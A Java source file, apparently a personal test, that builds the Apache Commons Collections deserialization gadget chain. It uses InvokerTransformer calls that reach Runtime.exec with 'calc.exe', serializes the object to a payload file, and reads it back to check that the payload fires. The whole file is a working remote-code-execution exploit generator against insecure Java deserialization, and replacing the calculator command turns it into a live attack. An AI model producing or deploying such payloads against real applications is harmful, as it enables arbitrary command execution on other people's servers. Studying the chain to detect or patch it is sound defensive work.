package org.ruos.test;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class javaSeriTest2 {

	public static void main(String[] args) throws Exception {
	    Transformer[] transformers = new Transformer[] {
	        new ConstantTransformer(Runtime.class),
	        new InvokerTransformer("getMethod", new Class[] {
	            String.class, Class[].class }, new Object[] {
	            "getRuntime", new Class[0] }),
	        new InvokerTransformer("invoke", new Class[] {
	            Object.class, Object[].class }, new Object[] {
	            null, new Object[0] }),
	        new InvokerTransformer("exec", new Class[] {
	            String.class }, new Object[] {"calc.exe"})};
	 
	    //多个Transformer还能串起来，形成ChainedTransformer
	    Transformer transformedChain = new ChainedTransformer(transformers);
	 
	    Map innerMap = new HashMap();
	    //
	    innerMap.put("value", "value");
	    Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);
	 
	    Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
	    Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
	    ctor.setAccessible(true);
	    Object instance = ctor.newInstance(Retention.class, outerMap);
	    
	    File f = new File("d:/payload.bin");
	    ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
	    out.writeObject(instance);
	    out.flush();
	    out.close();
	    
		// 这里为测试上面的tansform是否会触发payload
	    payloadTest("d:/payload.bin");
	 
	}
	
	public static void payloadTest(String file) throws Exception {
		ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
		in.readObject();
		in.close();
	}
}